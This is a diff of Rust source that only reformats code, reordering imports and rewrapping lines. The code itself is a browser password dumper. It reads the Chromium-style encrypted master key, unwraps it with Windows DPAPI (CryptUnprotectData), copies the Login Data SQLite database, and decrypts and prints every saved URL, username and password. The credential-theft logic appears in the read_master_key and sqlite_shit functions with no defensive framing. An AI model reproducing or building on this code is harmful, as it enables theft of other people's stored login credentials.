@@ -1,11 +1,11 @@
-use aes_gcm::{Aes256Gcm, Nonce, Key};
 use aes_gcm::aead::{Aead, NewAead};
+use aes_gcm::{Aes256Gcm, Key, Nonce};
 #[cfg(not(target_family = "windows"))]
 use colored::*;
 use serde_json as json;
+use sqlite;
 use std::path;
 use std::ptr;
-use sqlite;
 use windows::Win32::{
     Security::Cryptography::{CryptUnprotectData, CRYPTOAPI_BLOB},
     System::Memory::LocalFree,
@@ -44,9 +44,7 @@ fn read_master_key() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let key = &v["os_crypt"]["encrypted_key"];
     let secret_key_base64 = key.as_str().unwrap_or_default();
 
-    let secret_key = base64
-            ::decode(secret_key_base64)?[5..]
-            .to_vec();
+    let secret_key = base64::decode(secret_key_base64)?[5..].to_vec();
 
     Ok(secret_key)
 }
@@ -93,24 +91,28 @@ fn sqlite_shit(key: &Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
     std::fs::copy(login_data_path, temp_path)?;
 
     let conn = sqlite::open(temp_path)?;
-    let mut statement = conn
-                .prepare("SELECT action_url, username_value, password_value FROM logins;")
-                ?;
+    let mut statement =
+        conn.prepare("SELECT action_url, username_value, password_value FROM logins;")?;
 
     let headers = "URL; Username; Password";
-    println!("{text}\n{len}", text=headers, len="-".repeat(headers.len()));
+    println!(
+        "{text}\n{len}",
+        text = headers,
+        len = "-".repeat(headers.len())
+    );
     while let sqlite::State::Row = statement.next()? {
         let action_url = statement.read::<String>(0)?;
         let username_value = statement.read::<String>(1)?;
         let password_value = statement.read::<Vec<u8>>(2)?;
 
         let decrypted_pass = decyrpt_password(&password_value, &key)
-                                    .unwrap_or(
-                                        "<couldn't decrypt password>"
-                                        .as_bytes()
-                                        .to_vec()
-                                    );
-        println!("{}; {}; {}", action_url, username_value, String::from_utf8(decrypted_pass)?);
+            .unwrap_or("<couldn't decrypt password>".as_bytes().to_vec());
+        println!(
+            "{}; {}; {}",
+            action_url,
+            username_value,
+            String::from_utf8(decrypted_pass)?
+        );
     }
 
     Ok(())
